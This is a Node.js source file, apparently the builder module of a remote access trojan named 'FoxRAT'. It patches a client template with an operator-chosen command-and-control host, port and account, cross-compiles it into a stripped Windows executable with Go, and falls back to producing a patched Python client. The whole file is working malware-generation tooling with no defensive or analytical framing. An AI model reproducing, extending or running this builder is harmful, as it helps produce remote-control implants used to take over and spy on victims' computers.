const { execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

exports.build = function(options) {
    const { filename, host, port, account } = options;
    const safeName = (filename || 'FoxRAT').replace(/[^a-zA-Z0-9_-]/g, '') || 'FoxRAT';

    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'foxrat_build_'));
    try {
        const goSrc = path.join(__dirname, 'client_go', 'main.go');
        if (!fs.existsSync(goSrc)) {
            return buildPython(options, tmpDir);
        }

        const source = fs.readFileSync(goSrc, 'utf8');
        const modified = source
            .replace(/SERVER_HOST = ".*?"/, `SERVER_HOST = "${host || '127.0.0.1'}"`)
            .replace(/SERVER_PORT = \d+/, `SERVER_PORT = ${Number(port) || 3000}`)
            .replace(/ACCOUNT = ".*?"/, `ACCOUNT = "${account || 'default'}"`);

        const modFile = `module foxrat\n\ngo 1.21\n`;
        fs.writeFileSync(path.join(tmpDir, 'main.go'), modified);
        fs.writeFileSync(path.join(tmpDir, 'go.mod'), modFile);

        const goEnv = { ...process.env, GOPATH: path.join(tmpDir, 'gopath'), GOCACHE: path.join(tmpDir, 'gocache') };
        execSync('go mod tidy', { cwd: tmpDir, timeout: 60000, stdio: 'pipe', env: goEnv });

        const outExe = path.join(tmpDir, safeName + '.exe');
        execSync(`GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o "${outExe}" .`, {
            cwd: tmpDir,
            timeout: 120000,
            stdio: 'pipe',
            env: goEnv
        });

        if (fs.existsSync(outExe)) {
            const data = fs.readFileSync(outExe);
            return { data, ext: '.exe' };
        }
    } catch (e) {
        console.log('[Builder] Go build failed:', e.message ? e.message.substring(0, 300) : e);
    }

    return buildPython(options, tmpDir);
};

function buildPython(options, tmpDir) {
    const { filename, host, port, account } = options;
    const safeName = (filename || 'FoxRAT').replace(/[^a-zA-Z0-9_-]/g, '') || 'FoxRAT';

    try {
        const clientPyPath = path.join(__dirname, 'client_py', 'client.py');
        if (!fs.existsSync(clientPyPath)) {
            throw new Error('No client source found');
        }
        const source = fs.readFileSync(clientPyPath, 'utf8');
        const modified = source
            .replace(/SERVER_HOST = ".*?"/, `SERVER_HOST = "${host || '127.0.0.1'}"`)
            .replace(/SERVER_PORT = \d+/, `SERVER_PORT = ${Number(port) || 3000}`)
            .replace(/ACCOUNT = ".*?"/, `ACCOUNT = "${account || 'default'}"`);

        try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch(_) {}
        return { data: Buffer.from(modified, 'utf8'), ext: '.py' };
    } catch (e) {
        try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch(_) {}
        throw e;
    }
}
